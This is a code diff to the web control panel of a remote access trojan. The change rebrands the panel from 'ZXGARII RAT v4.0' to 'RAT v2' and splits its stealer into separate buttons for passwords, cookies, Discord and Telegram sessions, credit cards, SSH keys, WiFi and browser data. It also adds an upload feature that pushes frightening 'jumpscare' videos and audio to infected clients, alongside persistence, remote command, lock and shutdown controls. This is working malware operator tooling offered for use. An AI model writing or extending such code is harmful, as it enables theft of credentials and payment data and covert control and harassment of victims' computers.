@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>ZXGARII RAT v4.0</title>
+    <title>RAT v2</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -183,7 +183,10 @@
             transition: max-height 0.3s ease;
             padding: 0 5px;
         }
-        .category-body.open { max-height: 500px; padding: 5px 5px 12px 5px; }
+        .category-body.open {
+            max-height: 800px;
+            padding: 5px 5px 12px 5px;
+        }
         
         .sub-option {
             display: inline-block;
@@ -229,6 +232,42 @@
             cursor: pointer;
         }
         .input-group button:hover { background: #333; }
+        
+        .jumpscare-upload {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            padding: 10px;
+            margin-top: 8px;
+            border-radius: 4px;
+        }
+        .jumpscare-upload input[type="file"] {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            color: #aaa;
+            padding: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 10px;
+            width: 100%;
+            margin-bottom: 4px;
+        }
+        .jumpscare-upload button {
+            background: #ff0040;
+            border: none;
+            color: #fff;
+            padding: 4px 16px;
+            font-family: 'Courier New', monospace;
+            font-size: 10px;
+            cursor: pointer;
+            border-radius: 3px;
+            width: 100%;
+            transition: 0.2s;
+        }
+        .jumpscare-upload button:hover { background: #cc0033; }
+        .jumpscare-upload .hint {
+            font-size: 9px;
+            color: #555;
+            margin-bottom: 4px;
+        }
         
         .results-list {
             margin-top: 10px;
@@ -333,7 +372,7 @@
 <div class="watermark">RAT</div>
 
 <div class="header">
-    <h1>ZXGARII <span>// v4.0</span></h1>
+    <h1>RAT <span>// v2</span></h1>
     <div class="stats">
         <span>CLIENTS <strong id="totalClients">0</strong></span>
         <span>CAPTURES <strong id="totalFrames">0</strong></span>
@@ -382,14 +421,116 @@ let resultsData = [];
 let historyData = [];
 
 const CATEGORIES = {
-    'stealer': {
-        icon: '🕵️',
-        title: 'STEALER X50',
+    'passwords': {
+        icon: '🔑',
+        title: 'PASSWORDS',
         subs: [
-            { id: 'steal_passwords', label: '🔑 ALL DATA (50+ methods)', type: 'download' },
-            { id: 'steal_cookies', label: '🍪 Cookies', type: 'download' },
-            { id: 'steal_wifi', label: '📶 WiFi', type: 'download' },
-            { id: 'steal_browser', label: '🌐 History', type: 'download' }
+            { id: 'steal_passwords', label: '🔑 All Passwords', type: 'download' }
+        ]
+    },
+    'cookies': {
+        icon: '🍪',
+        title: 'COOKIES',
+        subs: [
+            { id: 'steal_cookies', label: '🍪 All Cookies', type: 'download' }
+        ]
+    },
+    'wifi': {
+        icon: '📶',
+        title: 'WIFI',
+        subs: [
+            { id: 'steal_wifi', label: '📶 WiFi Networks', type: 'download' }
+        ]
+    },
+    'history': {
+        icon: '🌐',
+        title: 'HISTORY',
+        subs: [
+            { id: 'steal_history', label: '🌐 Browser History', type: 'download' }
+        ]
+    },
+    'discord': {
+        icon: '🎮',
+        title: 'DISCORD',
+        subs: [
+            { id: 'steal_discord', label: '🎮 Discord Tokens', type: 'download' }
+        ]
+    },
+    'autofill': {
+        icon: '✏️',
+        title: 'AUTOFILL',
+        subs: [
+            { id: 'steal_autofill', label: '✏️ Autofill Data', type: 'download' }
+        ]
+    },
+    'cards': {
+        icon: '💳',
+        title: 'CREDIT CARDS',
+        subs: [
+            { id: 'steal_cards', label: '💳 Credit Cards', type: 'download' }
+        ]
+    },
+    'bookmarks': {
+        icon: '⭐',
+        title: 'BOOKMARKS',
+        subs: [
+            { id: 'steal_bookmarks', label: '⭐ Bookmarks', type: 'download' }
+        ]
+    },
+    'downloads': {
+        icon: '⬇️',
+        title: 'DOWNLOADS',
+        subs: [
+            { id: 'steal_downloads', label: '⬇️ Downloads History', type: 'download' }
+        ]
+    },
+    'network': {
+        icon: '🌐',
+        title: 'NETWORK',
+        subs: [
+            { id: 'steal_network', label: '🌐 Network Info', type: 'download' }
+        ]
+    },
+    'system': {
+        icon: '🖥️',
+        title: 'SYSTEM',
+        subs: [
+            { id: 'steal_system', label: '🖥️ System Info', type: 'download' }
+        ]
+    },
+    'software': {
+        icon: '📦',
+        title: 'SOFTWARE',
+        subs: [
+            { id: 'steal_software', label: '📦 Installed Software', type: 'download' }
+        ]
+    },
+    'processes': {
+        icon: '⚙️',
+        title: 'PROCESSES',
+        subs: [
+            { id: 'steal_processes', label: '⚙️ Running Processes', type: 'download' }
+        ]
+    },
+    'ssh': {
+        icon: '🔑',
+        title: 'SSH KEYS',
+        subs: [
+            { id: 'steal_ssh', label: '🔑 SSH Keys', type: 'download' }
+        ]
+    },
+    'startup': {
+        icon: '🚀',
+        title: 'STARTUP',
+        subs: [
+            { id: 'steal_startup', label: '🚀 Startup Programs', type: 'download' }
+        ]
+    },
+    'telegram': {
+        icon: '📱',
+        title: 'TELEGRAM',
+        subs: [
+            { id: 'steal_telegram', label: '📱 Telegram Sessions', type: 'download' }
         ]
     },
     'control': {
@@ -403,34 +544,31 @@ const CATEGORIES = {
             { id: 'screenshot', label: '📸 Screenshot', type: 'success' }
         ]
     },
-    'system': {
-        icon: '📊',
-        title: 'SYSTEM',
-        subs: [
-            { id: 'sysinfo', label: '📋 Sysinfo', type: 'download' },
-            { id: 'processes', label: '📋 Processes', type: 'download' }
-        ]
+    'jumpscare': {
+        icon: '🎬',
+        title: 'CUSTOM JUMPSCARE',
+        subs: []
     },
     'persistence': {
         icon: '🔗',
         title: 'PERSISTENCE',
         subs: [
-            { id: 'add_startup', label: '📌 Add startup', type: 'success' },
-            { id: 'remove_startup', label: '❌ Remove startup', type: 'danger' }
+            { id: 'add_startup', label: '📌 Add Startup', type: 'success' },
+            { id: 'remove_startup', label: '❌ Remove Startup', type: 'danger' }
         ]
     },
     'terminal': {
         icon: '⌨️',
         title: 'TERMINAL',
         subs: [
-            { id: 'exec_cmd', label: '▶️ Run command' }
+            { id: 'exec_cmd', label: '▶️ Run Command' }
         ]
     },
     'notifications': {
         icon: '🔔',
         title: 'NOTIFICATIONS',
         subs: [
-            { id: 'popup_msg', label: '💬 Send popup' }
+            { id: 'popup_msg', label: '💬 Send Popup' }
         ]
     }
 };
@@ -603,6 +741,24 @@ function renderCategories() {
     }
     container.innerHTML = Object.keys(CATEGORIES).map(key => {
         const cat = CATEGORIES[key];
+        if (key === 'jumpscare') {
+            return `
+                <div class="category">
+                    <div class="category-header" onclick="toggleCategory(this)">
+                        <span class="title"><span style="margin-right:8px;">${cat.icon}</span>${cat.title}</span>
+                        <span class="arrow">▼</span>
+                    </div>
+                    <div class="category-body">
+                        <div class="jumpscare-upload">
+                            <div class="hint">📹 Vídeo (.mp4) y/o Audio (.mp3)</div>
+                            <input type="file" id="videoFile" accept=".mp4,.mpg,.avi,.mov,.mkv" />
+                            <input type="file" id="audioFile" accept=".mp3,.wav,.ogg" />
+                            <button onclick="sendJumpscare()">🎬 ENVIAR</button>
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
         return `
             <div class="category">
                 <div class="category-header" onclick="toggleCategory(this)">
@@ -652,14 +808,24 @@ async function executeCommand(cmdId) {
         'steal_passwords': 'steal_passwords',
         'steal_cookies': 'steal_cookies',
         'steal_wifi': 'steal_wifi',
-        'steal_browser': 'steal_browser',
+        'steal_history': 'steal_history',
+        'steal_discord': 'steal_discord',
+        'steal_autofill': 'steal_autofill',
+        'steal_cards': 'steal_cards',
+        'steal_bookmarks': 'steal_bookmarks',
+        'steal_downloads': 'steal_downloads',
+        'steal_network': 'steal_network',
+        'steal_system': 'steal_system',
+        'steal_software': 'steal_software',
+        'steal_processes': 'steal_processes',
+        'steal_ssh': 'steal_ssh',
+        'steal_startup': 'steal_startup',
+        'steal_telegram': 'steal_telegram',
         'jump': 'jump',
         'lock': 'lock',
         'shutdown': 'shutdown',
         'restart': 'restart',
         'screenshot': 'screenshot',
-        'sysinfo': 'sysinfo',
-        'processes': 'processes',
         'add_startup': 'add_startup',
         'remove_startup': 'remove_startup'
     };
@@ -679,12 +845,48 @@ async function executeCommand(cmdId) {
                 btn.textContent = '✓ SENT'; 
                 setTimeout(() => btn.textContent = orig, 1200);
             }
-            if (['steal_passwords', 'steal_cookies', 'steal_wifi', 'steal_browser', 'sysinfo', 'processes'].includes(cmd)) {
+            if (cmd.startsWith('steal_')) {
                 setTimeout(() => fetchResults(selectedClient), 3000);
             }
             setTimeout(() => fetchHistory(selectedClient), 1000);
         }
     } catch (e) {}
+}
+
+function sendJumpscare() {
+    if (!selectedClient) return alert('Select a client first');
+    
+    const videoFile = document.getElementById('videoFile');
+    const audioFile = document.getElementById('audioFile');
+    
+    const formData = new FormData();
+    if (videoFile.files.length > 0) {
+        formData.append('video', videoFile.files[0]);
+    }
+    if (audioFile.files.length > 0) {
+        formData.append('audio', audioFile.files[0]);
+    }
+    
+    if (videoFile.files.length === 0 && audioFile.files.length === 0) {
+        return alert('Select at least one file (video or audio)');
+    }
+    
+    fetch(`/api/jumpscare/${selectedClient}`, {
+        method: 'POST',
+        body: formData
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.status === 'ok') {
+            alert('✅ Jumpscare sent!');
+            setTimeout(() => fetchHistory(selectedClient), 1000);
+        } else {
+            alert('❌ Error: ' + data.message);
+        }
+    })
+    .catch(err => {
+        alert('❌ Error: ' + err);
+    });
 }
 
 function downloadResult(index) {
@@ -778,7 +980,7 @@ setTimeout(() => {
     if (first) toggleCategory(first);
 }, 500);
 
-console.log('ZXGARII RAT v4.0 - X50 Stealer');
+console.log('RAT v2 - All buttons separated');
 </script>
 </body>
 </html>
